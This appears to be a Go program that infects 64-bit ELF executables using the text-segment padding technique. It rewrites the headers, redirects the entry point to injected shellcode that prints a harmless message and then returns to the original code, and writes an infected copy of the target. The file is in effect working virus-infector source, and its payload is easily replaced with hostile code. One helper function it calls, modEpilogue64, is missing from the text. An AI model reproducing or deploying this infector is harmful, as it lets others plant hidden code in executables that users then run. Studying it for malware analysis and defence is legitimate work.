/*
[1] Increase p_shoff by PAGE_SIZE in the ELF header
[2] Patch the insertion code (parasite) to jump to the entry point (original)
[3] Locate the text segment program header
[4] Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
[5] Increase p_filesz by account for the new code (parasite)
[6] Increase p_memsz to account for the new code (parasite)
[7] For each phdr who's segment is after the insertion (text segment)
[8] increase p_offset by PAGE_SIZE
[9] For the last shdr in the text segment
[10] increase sh_len by the parasite length
[11] For each shdr who's section resides after the insertion
[12] Increase sh_offset by PAGE_SIZE
[13] Physically insert the new code (parasite) and pad to PAGE_SIZE, into the file - text segment p_offset + p_filesz (original)
*/

package main

import (
	"bytes"
	"debug/elf"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"encoding/binary"
)

const (
	SUCCESS       int    = 0
	FAILURE       int    = 1
	x64_PAGE_SIZE uint64 = 4096 //
	x86_PAGE_SIZE int    = 4096
	PAGE_SIZE     int    = 4096
)

var payload64 = []byte{
	0x57,       //push   %rdi
	0x56,       //push   %rsi
	0x52,       //push   %rdx
	0xeb, 0x00, //jmp    401005 <message>

	//0000000000401005 <message>:
	0xe8, 0x2b, 0x00, 0x00, 0x00, //call   401035 <shellcode>
	0x68, 0x65, 0x6c, 0x6c, 0x6f, //push   $0x6f6c6c65
	0x20, 0x2d, 0x2d, 0x20, 0x74, 0x68, //and    %ch,0x6874202d(%rip)        # 68b43042 <__bss_start+0x68741042>
	0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61, //imul   $0x61207369,0x20(%rbx),%esi
	0x20, 0x6e, 0x6f, //and    %ch,0x6f(%rsi)
	0x6e,                   //outsb  %ds:(%rsi),(%dx)
	0x20, 0x64, 0x65, 0x73, //and    %ah,0x73(%rbp,%riz,2)
	0x74, 0x72, //je     401098 <get_eip+0x37>
	0x75, 0x63, //jne    40108b <get_eip+0x2a>
	0x74, 0x69, //je     401093 <get_eip+0x32>
	0x76, 0x65, //jbe    401091 <get_eip+0x30>
	0x20, 0x70, 0x61, //and    %dh,0x61(%rax)
	0x79, 0x6c, //jns    40109d <get_eip+0x3c>
	0x6f,       //outsl  %ds:(%rsi),(%dx)
	0x61,       //(bad)
	0x64, 0x0a, //or     %fs:0x1(%rax),%bh

	//0000000000401035 <shellcode>:
	0xb8, 0x01, 0x00, 0x00, 0x00, //mov    $0x1,%eax
	0xbf, 0x01, 0x00, 0x00, 0x00, //mov    $0x1,%edi
	0x5e,                         //pop    %rsi
	0xba, 0x2a, 0x00, 0x00, 0x00, //mov    $0x2a,%edx
	0x0f, 0x05, //syscall
	0x5a,                         //pop    %rdx
	0x5e,                         //pop    %rsi
	0x5f,                         //pop    %rdi
	/*
	0xe8, 0x12, 0x00, 0x00, 0x00, //call   401061 <get_eip>
	0x48, 0x83, 0xe8, 0x4f, 	//sub    $0x4f,%rax
	0x48, 0x2d, 0xd1, 0x73, 0x01, 0x00, //sub    $0x173d1,%rax
	0x48, 0x05, 0x20, 0x5b, 0x00, 0x00, //add    $0x5b20,%rax
	0xff, 0xe0, //jmp    *%rax

	//0000000000401061 <get_eip>:
	0x48, 0x8b, 0x04, 0x24, //mov    (%rsp),%rax
	0xc3, //ret
	*/
}

var dummypayload = []byte{0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44}

func isElf(magic []byte) bool {
	return !(magic[0] != '\x7f' || magic[1] != 'E' || magic[2] != 'L' || magic[3] != 'F')
}

func checkError(e error) {
	if e != nil {
		panic(e)
	}
}

func usage() {
	fmt.Println("Usage: ", os.Args[0], "<target_file>")
	os.Exit(FAILURE)
}

func main() {
	if len(os.Args) < 2 {
		usage()
	}
	var debug bool = true

	origFile := os.Args[1]

	origFileHandle, err := os.Open(origFile)
	checkError(err)
	defer origFileHandle.Close()

	var magic [4]byte
	origFileHandle.Read(magic[:])

	if !isElf(magic[:4]) {
		fmt.Println("This is not an Elf binary")
		os.Exit(FAILURE)
	}

	fStat, err := origFileHandle.Stat()
	checkError(err)

	// oSize := fStat.Size()

	origFileBuf := make([]byte, fStat.Size())
	origFileHandle.Seek(0, io.SeekStart)
	origFileHandle.Read(origFileBuf[:])

	origFileReader := bytes.NewReader(origFileBuf)

	var elfHeader elf.Header64
	binary.Read(origFileReader, binary.LittleEndian, &elfHeader)

	//save the original entry point of the program and old offset of section hdr table
	var oEntry uint64
	var oShoff uint64
	oEntry = elfHeader.Entry
	oShoff = elfHeader.Shoff

	//[1] increase the e_shoff by PAGESIZE
	elfHeader.Shoff += x64_PAGE_SIZE

	//[3]locate program header table
	pHeaders := make([]elf.Prog64, elfHeader.Phnum)
	phSectionReader := io.NewSectionReader(origFileReader, int64(elfHeader.Phoff), int64(elfHeader.Phentsize*elfHeader.Phnum))
	binary.Read(phSectionReader, binary.LittleEndian, pHeaders)

	/*
		Need to save the index of the .text segment when you find it.
		That way you can adjust the Memsz and Filesz by PAGESIZE
	*/

	var textNdx int
	var textSegEnd uint64
	var retStub []byte 
	for i := 0; i < int(elfHeader.Phnum); i++ {
		if elf.ProgType(pHeaders[i].Type) == elf.PT_LOAD && (elf.ProgFlag(pHeaders[i].Flags) == (elf.PF_X | elf.PF_R)) {
			//fmt.Printf("text segment offset @ 0x%x and is %d/%d", pHeaders[i].Off, i, elfHeader.Phnum)
			textNdx = i
			//[4]
			elfHeader.Entry = pHeaders[i].Vaddr + pHeaders[i].Filesz
			if debug {
				fmt.Printf("[+] Modified entry point from 0x%x -> 0x%x\n", oEntry, elfHeader.Entry)
			}
			//[5] && [6]
			textSegEnd = pHeaders[i].Off + pHeaders[i].Filesz
			fmt.Printf("text segment ends @ 0x%x\n", textSegEnd)
			fmt.Printf("Payload size pre-epilogue 0x%x", len(payload64))
			retStub = modEpilogue64(int32(len(payload64) + 5), elfHeader.Entry, oEntry)
			payload64 = append(payload64, retStub...)
			fmt.Printf("Payload size post-epilogue 0x%x", len(payload64))

			fmt.Print("[")
			for _, h := range payload64 {
				fmt.Printf("0x%02x ", h)
			}
			fmt.Println("]")

			pHeaders[i].Memsz += uint64(len(payload64))
			pHeaders[i].Filesz += uint64(len(payload64))
			if debug {
				fmt.Println("[+] Generated and appended position independent return 2 OEP stub to payload")
				fmt.Printf("[+] Increased text segment p_filesz and p_memsz by %d (length of payload)\n", len(payload64))
			}
		}
	}

	//Adjust the file offsets of each segment program header after the text segment program header
	if debug {
		fmt.Println("[+] Adjusting segments after text segment file offsets by 0x2000")
	}
	// [7] && [8]
	for j := textNdx; j < int(elfHeader.Phnum); j++ {
		if pHeaders[textNdx].Off < pHeaders[j].Off {
			if debug {
				fmt.Println("Inceasing pHeader @ index ", j, "by 0x1000")
			}
			pHeaders[j].Off += x64_PAGE_SIZE
		}
	}

	// Elf header and program header table are adjacent to each other in the file
	infectedBuf := new(bytes.Buffer)
	binary.Write(infectedBuf, binary.LittleEndian, &elfHeader)
	binary.Write(infectedBuf, binary.LittleEndian, pHeaders)

	ephdrsz := int(elfHeader.Ehsize) + int(elfHeader.Phentsize*elfHeader.Phnum)
	binary.Write(infectedBuf, binary.LittleEndian, origFileBuf[ephdrsz:])

	//section header table comes after the data segment, we'll need a section reader
	infectedReader := bytes.NewReader(infectedBuf.Bytes())
	sectionTableReader := io.NewSectionReader(infectedReader, int64(oShoff), int64(elfHeader.Shentsize*elfHeader.Shnum))

	sectionHdrTable := make([]elf.Section64, elfHeader.Shnum)
	binary.Read(sectionTableReader, binary.LittleEndian, sectionHdrTable)

	if debug {
		fmt.Println("[+] Increasing section header addresses if they come after text segment")
	}

	for k := 0; k < int(elfHeader.Shnum); k++ {
		if sectionHdrTable[k].Off >= textSegEnd {
			if debug {
				fmt.Printf("[+] (%d) Updating sections past text segment @ addr 0x%x\n", k, sectionHdrTable[k].Addr)
			}
			sectionHdrTable[k].Off += x64_PAGE_SIZE
			//elfHeader.Entry here was previously adjust to be start of parasite
		} else if (sectionHdrTable[k].Size + sectionHdrTable[k].Addr) == elfHeader.Entry {
			if debug {
				fmt.Println("[+] Extending section size of sectionhdr associated with text segment")
			}
			sectionHdrTable[k].Size += uint64(len(payload64))
		}
	}

	infectedShdrTable := new(bytes.Buffer)
	binary.Write(infectedShdrTable, binary.LittleEndian, sectionHdrTable)

	finalInfectionTwo := make([]byte, infectedBuf.Len()+int(PAGE_SIZE))
	fmt.Println("Infected buf len  => ", infectedBuf.Len())
	finalInfection := infectedBuf.Bytes()

	copy(finalInfection[int(oShoff):], infectedShdrTable.Bytes())

	end_of_infection := int(textSegEnd)
	fmt.Printf("end_of_infection @ 0x%x\n", end_of_infection)
	copy(finalInfectionTwo, finalInfection[:end_of_infection])
	if debug {
		fmt.Println("[+] writing payload into the binary")
	}
	copy(finalInfectionTwo[end_of_infection:], payload64)
	copy(finalInfectionTwo[end_of_infection+PAGE_SIZE:], finalInfection[end_of_infection:])
	infectedFileName := fmt.Sprintf("%s-copy", origFile)

	err = ioutil.WriteFile(infectedFileName, finalInfectionTwo, 0751)
	checkError(err)
	fmt.Println("finalInfectionTwo cap => ", cap(finalInfectionTwo), "finalInfectionTwo len => ", len(finalInfectionTwo))

}
